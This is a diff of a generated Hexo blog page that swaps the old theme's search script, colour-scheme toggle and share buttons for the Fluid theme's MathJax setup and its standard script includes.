-                  if (index_title < 0 && index_content < 0) {
-                    isMatch = false;
-                  } else {
-                    if (index_content < 0) {
-                      index_content = 0;
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
                     }
-                    if (i == 0) {
-                      first_occur = index_content;
-                    }
-                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
-                  }
-                });
-              } else {
-                isMatch = false;
-              }
-              // 0x05. show search results
-              if (isMatch) {
-                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
-                var content = orig_data_content;
-                if (first_occur >= 0) {
-                  // cut out 100 characters
-                  var start = first_occur - 20;
-                  var end = first_occur + 80;
-
-                  if (start < 0) {
-                    start = 0;
-                  }
-
-                  if (start == 0) {
-                    end = 100;
-                  }
-
-                  if (end > content.length) {
-                    end = content.length;
-                  }
-
-                  var match_content = content.substr(start, end);
-
-                  // highlight all keywords
-                  keywords.forEach(function (keyword) {
-                    var regS = new RegExp(keyword, "gi");
-                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                   });
-
-                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
-                }
-                str += "</li>";
+                }, '', false]
               }
-            });
-            str += "</ul>";
-            if (str.indexOf('<li>') === -1) {
-              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
             }
-            $resultContent.innerHTML = str;
-          });
-        },
-        error: function(xhr, status, error) {
-          $resultContent.innerHTML = ""
-          if (xhr.status === 404) {
-            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
-          } else {
-            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
-          }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
         }
-      });
-      $(document).on('click', '#search-close-icon', function() {
-        $('#search-input').val('');
-        $('#search-result').html('');
-      });
-    }
+      </script>
+    
 
-    var getSearchFile = function() {
-        var path = "/search.xml";
-        searchFunc(path, 'search-input', 'search-result');
-    }
-  </script>
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
 
 
 
 
-        
-  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
-    <a href="javascript: void(0)">
-      <i id="theme-icon" class="iconfont icon-moon"></i>
-    </a>
-  </div>
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
 
   
-<script src="/js/colorscheme.js"></script>
 
-
-
-
-
-        
-  
-    <div class="share-icon tools-bar-item">
-      <a href="javascript: void(0)" id="share-icon">
-        <i class="iconfont iconshare"></i>
-      </a>
-      <div class="share-content hidden">
-        
-          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E3%80%90CTF.0x06%E3%80%91D%5E%203CTF2022%20d3kheap%20%E5%87%BA%E9%A2%98%E6%89%8B%E8%AE%B0 + '&url=' + http%3A%2F%2Fblog.arttnba3.cn%2F2022%2F03%2F08%2FCTF-0X06-D3CTF2022_D3KHEAP%2F + '" target="_blank" title="Twitter">
-            <i class="iconfont icon-twitter"></i>
-          </a>
-        
-        
-          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://blog.arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/" target="_blank" title="Facebook">
-            <i class="iconfont icon-facebooksquare"></i>
-          </a>
-        
-      </div>
-    </div>
-  
-  
-<script src="/js/shares.js"></script>
-
-
-
-      </div>
-    </div>
-  </body>
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
 </html>
